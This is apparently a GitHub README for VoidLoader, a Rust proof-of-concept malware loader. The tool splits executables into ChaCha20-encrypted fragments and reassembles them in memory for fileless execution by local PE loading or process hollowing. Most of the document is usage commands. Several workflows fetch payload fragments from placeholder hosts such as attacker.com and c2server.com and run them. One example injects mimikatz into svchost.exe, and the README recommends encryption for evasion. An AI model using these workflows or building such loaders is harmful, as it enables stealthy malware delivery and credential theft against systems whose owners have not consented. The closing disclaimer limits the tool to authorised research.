# Void Loader - Fractionated Binary Execution PoC

<img width="1280" height="457" alt="image" src="https://github.com/user-attachments/assets/dea4b871-6c90-41d8-9974-5d2616ec5de3" />

## Overview

VoidLoader is a proof-of-concept implementation inspired by the "Fractionated Cavity Infector" technique from vx-underground's Black Mass Volume I. This PoC demonstrates fractionated binary distribution, in-memory mount & execution.

The toolkit splits PE executables into multiple fragments, distributes them across different locations, and reconstructs them entirely in memory for execution—without touching the disk.

## Components

- **MainLib**: Shared core functionality with ChaCha20 encryption
- **Splitter**: Splits PE binaries into N parts with optional ChaCha20 encryption and cryptographic checksums
- **Mounter**: Downloads/loads fragments, decrypts if needed, reconstructs in memory, and executes via multiple techniques
  - **MounterCLI**: A CLI for run a simple loader (supports HTTP and local filesystem)
  - **MounterLib**: Core library with execution methods (Local PE, Process Hollowing, Thread Hijacking)
- **Demo**: Example implementations showing direct MounterLib usage

## Build

### Basic Build

```bash
cargo build --release
```

This generates three binaries:
- `target/release/splitter.exe` - Binary splitter tool
- `target/release/mounter.exe` - Fragment loader and executor
- `target/release/demo.exe` - Example implementation

## Usage

### 1. Splitting a Binary

The splitter tool divides an executable into multiple fragments, each with a verification header containing checksums and metadata.

```bash
# Split into 3 parts (default)
./target/release/splitter.exe payload.exe

# Split into 5 parts with custom output directory
./target/release/splitter.exe payload.exe --pieces 5 --output ./fragments

# Split with custom name prefix
./target/release/splitter.exe mimikatz.exe --pieces 10 --name beacon
```

**Output example:**
```
File split successfully into 5 parts
  Output directory: .
  File pattern: payload.part000, payload.part001, ...
```

Each fragment contains a header with magic bytes (`SPLT`), part numbers, and SHA256 checksums for integrity validation.

**Encrypted splitting (recommended for evasion):**
```bash
# Split with ChaCha20 encryption
./target/release/splitter.exe payload.exe --pieces 5 --password "your_secret_password"
```

Encrypted fragments use a v2 header (128 bytes) with unique salt and nonce per fragment. The data is encrypted with ChaCha20 using PBKDF2-derived keys (100,000 iterations).

### 2. Loading and Executing Fragments

The mounter can load fragments from HTTP URLs or local filesystem (auto-detected), validates their integrity, reconstructs the binary in memory, and executes it using multiple techniques (Local PE or Process Hollowing).

```bash
# Basic usage - download from HTTP
./target/release/mounter.exe \
  -u http://192.168.1.100/payload.part000 \
  -u http://192.168.1.100/payload.part001 \
  -u http://192.168.1.100/payload.part002

# Load from local files (auto-detected, no HTTP server needed)
./target/release/mounter.exe \
  -u ./fragments/payload.part000 \
  -u ./fragments/payload.part001 \
  -u ./fragments/payload.part002

# Decrypt encrypted fragments with password
./target/release/mounter.exe \
  -u http://server.com/encrypted.part000,http://server.com/encrypted.part001 \
  --password "your_secret_password"

# Local encrypted fragments
./target/release/mounter.exe \
  -u ./payload.part000,./payload.part001,./payload.part002 \
  --password "your_secret_password" \
  -v

# Multiple URLs with comma separation
./target/release/mounter.exe -u http://server.com/file.part000,http://server.com/file.part001

# With custom timeout (default: 30s)
./target/release/mounter.exe -u url1,url2,url3 --timeout 60

# Dry-run mode (download and validate only, no execution)
./target/release/mounter.exe -u url1,url2,url3 --dry-run

# Verbose output
./target/release/mounter.exe -u url1,url2 --verbose

# Execution Methods (-m flag)
# Default: local-pe (direct in-memory execution)
./target/release/mounter.exe -u url1,url2 -m local-pe

# Process Hollowing (requires --target and x64 PE)
./target/release/mounter.exe -u url1,url2 -m process-hollowing --target "C:\Windows\System32\notepad.exe"
```

**Complete workflow examples:**

```bash
# Standard workflow (unencrypted)
# 1. Split your payload
./target/release/splitter.exe beacon.exe --pieces 3

# 2. Host fragments on a web server
python -m http.server 8000

# 3. Execute from another machine
./target/release/mounter.exe \
  -u http://attacker.com:8000/beacon.part000 \
  -u http://attacker.com:8000/beacon.part001 \
  -u http://attacker.com:8000/beacon.part002 \
  -m local-pe
```

```bash
# Encrypted workflow (recommended for evasion)
# 1. Split with encryption
./target/release/splitter.exe mimikatz.exe --pieces 5 --password "Op3r@t10n_2024" -v

# 2. Host encrypted fragments
python -m http.server 8000

# 3. Download, decrypt, and execute
./target/release/mounter.exe \
  -u http://c2server.com:8000/mimikatz.part000,http://c2server.com:8000/mimikatz.part001,http://c2server.com:8000/mimikatz.part002,http://c2server.com:8000/mimikatz.part003,http://c2server.com:8000/mimikatz.part004 \
  --password "Op3r@t10n_2024" \
  -m process-hollowing \
  --target "C:\Windows\System32\svchost.exe" \
  -v
```

```bash
# Local testing workflow (no web server needed)
# 1. Split with encryption
./target/release/splitter.exe payload.exe --pieces 3 --password "test123"

# 2. Test locally without network
./target/release/mounter.exe \
  -u ./payload.part000,./payload.part001,./payload.part002 \
  --password "test123" \
  --dry-run \
  -v
```

The binary is reconstructed entirely in RAM and optionally injected into a suspended Windows process (MITRE T1055) without ever being written to disk.

### 3. Demo Example

The `demo` binary shows how to use the VoidLoader libraries directly without CLI arguments. It downloads two fragments from localhost, reconstructs them, and executes the resulting binary.

```bash
# Run the demo (expects fragments on http://127.0.0.1/)
./target/release/demo.exe
```

The demo code can be found in `crates/demo/src/main.rs` and demonstrates direct usage of:
- `download::http::download_all_as_map()` - Download fragments
- `reconstruct::rebuild_from_parts()` - Reconstruct binary
- `execution::local_pe::inject_and_execute()` - Execute in memory

## References

- [Black Mass Volume I - vx-underground](https://vx-underground.org/Papers/VXUG%20Zines)
- [Process Hollowing - MITRE ATT&CK T1055.012](https://attack.mitre.org/techniques/T1055/012/)

## Legal Disclaimer

This tool is provided "as is" for educational and security research purposes only. The authors are not responsible for misuse. Users are solely responsible for compliance with applicable laws in their jurisdiction.

**DO NOT USE THIS TOOL ON SYSTEMS WITHOUT EXPLICIT AUTHORISATION.**

